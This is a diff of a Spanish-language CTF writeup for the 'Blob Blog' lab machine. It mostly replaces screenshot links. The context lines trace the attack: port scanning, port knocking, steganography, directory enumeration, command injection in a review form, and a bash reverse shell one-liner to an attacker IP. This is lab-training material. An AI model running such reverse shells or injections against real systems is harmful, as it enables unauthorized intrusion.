@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/196b3dcb-ee8a-4fe0-a9d7-fdae456f5b33" alt="Blob Blog" width="627">
+  <img width="621" height="150" alt="Screenshot 2026-09-22 155347" src="https://github.com/user-attachments/assets/9047bbba-f9df-4199-8ee7-87a0d0da8d8e" />
 </p>
 
 # Blob Blog — CTF Writeup
@@ -34,15 +34,14 @@ nmap -sS -p- --min-rate=5000 -Pn -n 10.67.183.58 -oG portus
 - `-Pn`: asume que el host está activo.
 - `-n`: evita resolución DNS.
 - `-oG portus`: guarda la salida en formato grepable.
+<img width="560" height="187" alt="Screenshot 2026-09-22 160037" src="https://github.com/user-attachments/assets/274de5b5-9e0f-4439-9c50-731454c8a6a5" />
+
+
 
 Inicialmente encontré:
-
 - **22/tcp — SSH**
 - **80/tcp — HTTP**
 
-![Nmap](https://github.com/user-attachments/assets/0a78b6f6-551f-4db4-9e07-5176d3ecd185)
-
-![Nmap results](https://github.com/user-attachments/assets/a7c17223-6c84-45af-afe9-9f50a70323cb)
 
 SSH no era especialmente útil todavía porque no tenía credenciales.
 
@@ -52,9 +51,15 @@ SSH no era especialmente útil todavía porque no tenía credenciales.
 
 La página inicial no mostraba nada evidente, así que revisé el código fuente.
 
-![Código fuente](https://github.com/user-attachments/assets/0abc7270-d117-40a2-865c-ac94f1eee5c6)
+
 
 Encontré un bloque codificado. Después de decodificarlo aparecía una pista relacionada con **"knock"** y tres números.
+
+
+
+<img width="823" height="506" alt="Screenshot 2026-09-22 160337" src="https://github.com/user-attachments/assets/e5f296d3-9d8c-4df1-9463-0b3bee62e347" />
+
+
 
 Esto apuntaba a un mecanismo de **port knocking**.
 
@@ -70,7 +75,10 @@ knock 10.67.183.58 {puertos, separados por espacio}
 
 Después del knocking volví a escanear la máquina y aparecieron nuevos servicios.
 
-![Nuevos puertos](https://github.com/user-attachments/assets/c78232f8-7417-40a8-8db3-c50e9d58136f)
+
+<img width="770" height="340" alt="Screenshot 2026-09-22 161701" src="https://github.com/user-attachments/assets/229de7f9-df51-4b9b-a8ab-c4cfaf62294c" />
+
+
 
 ---
 
@@ -84,6 +92,11 @@ La información encontrada permitió identificar al usuario **Bob** y obtener un
 
 Con las credenciales obtenidas pude acceder al FTP.
 
+
+<img width="540" height="225" alt="Screenshot 2026-09-22 162908" src="https://github.com/user-attachments/assets/9fc4409e-a441-4f4c-8b43-acbcac13e04c" />
+
+
+
 ---
 
 ## 🕵️ 4. Esteganografía
@@ -96,7 +109,7 @@ Al analizarla con `steghide`, la herramienta solicitó una contraseña, por lo q
 steghide extract -sf cool.jpeg
 ```
 
-![Steghide](https://github.com/user-attachments/assets/5afb99b4-0d9c-41a5-bf23-135e1ae22f69)
+<img width="302" height="82" alt="Screenshot 2026-09-22 163734" src="https://github.com/user-attachments/assets/ce02cf67-0d61-4652-9544-5f63abab6d6b" />
 
 La información extraída tenía apariencia de texto cifrado y también incluía una pista relacionada con un directorio.
 
@@ -114,7 +127,7 @@ dirsearch -u 10.67.183.58:445 -e * -r
 
 La enumeración reveló una ruta interesante y, revisando su contenido, encontré otra contraseña.
 
-![Enumeración](https://github.com/user-attachments/assets/ba6fe7d7-7a35-4bb7-91ef-5a387fa7dcf3)
+<img width="862" height="117" alt="Screenshot 2026-09-22 163906" src="https://github.com/user-attachments/assets/60971308-c218-4f89-87ba-06bc0078795e" />
 
 Con la información obtenida pude continuar con la imagen y llegar a **Bob's drawer**.
 
@@ -128,6 +141,13 @@ El resultado fueron las credenciales de Bob.
 
 ---
 
+
+
+![Reverse shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)
+
+
+
+
 ## 💻 6. Aplicación web — Puerto 8080
 
 El puerto **8080** mostraba otra aplicación HTTP basada en Apache.
@@ -140,7 +160,8 @@ python3 /opt/dirsearch/dirsearch.py -u 10.67.183.58:8080 -e * -r
 
 Las rutas encontradas redirigían a un login. Las credenciales de Bob funcionaron.
 
-![Puerto 8080](https://github.com/user-attachments/assets/98263c4d-4efe-44a6-bd88-9eec2c631b46)
+<img width="680" height="222" alt="Screenshot 2026-09-22 164519" src="https://github.com/user-attachments/assets/beb721a5-ef6a-470f-a7f0-8bf46184cf32" />
+
 
 Después de iniciar sesión encontré una página de review con un campo de entrada.
 
@@ -156,7 +177,7 @@ ls
 
 La salida del comando aparecía reflejada en la página, confirmando que la aplicación estaba ejecutando comandos.
 
-![Command execution](https://github.com/user-attachments/assets/e24765f6-75d5-4e02-9c4a-4a2aea77a0ad)
+<img width="856" height="102" alt="Screenshot 2026-09-22 164654" src="https://github.com/user-attachments/assets/5d2fd52a-7108-4923-806b-8b5ef8306c73" />
 
 ---
 
@@ -170,7 +191,7 @@ bash -i >& /dev/tcp/10.9.1.161/4444 0>&1
 
 Esto permitió obtener una shell como **www-data**.
 
-![Reverse shell](https://github.com/user-attachments/assets/c70a6a83-25db-435d-b99b-655d17c90eab)
+<img width="627" height="116" alt="Screenshot 2026-09-22 171604" src="https://github.com/user-attachments/assets/259f0465-e408-41e1-99b8-f18b59ef317d" />
 
 Después mejoré la terminal:
 
@@ -188,7 +209,6 @@ fg
 export TERM=xterm-256color
 ```
 
-![Shell](https://github.com/user-attachments/assets/0461806b-6696-43d7-9e82-9bc81c188d3c)
 
 ---
 
@@ -211,8 +231,6 @@ Entre los resultados apareció un binario poco habitual llamado:
 ```text
 blogFeeback
 ```
-
-![SUID enumeration](https://github.com/user-attachments/assets/a9cd5c6a-abc7-4c8d-80db-c56e13a94eab)
 
 ### Análisis con Ghidra
 
@@ -245,7 +263,6 @@ pspy reveló un proceso muy interesante:
 /bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/.also_boring/.still_boring
 ```
 
-![Proceso programado](https://github.com/user-attachments/assets/170155?dummy=1)
 
 La cadena hacía varias cosas:
 
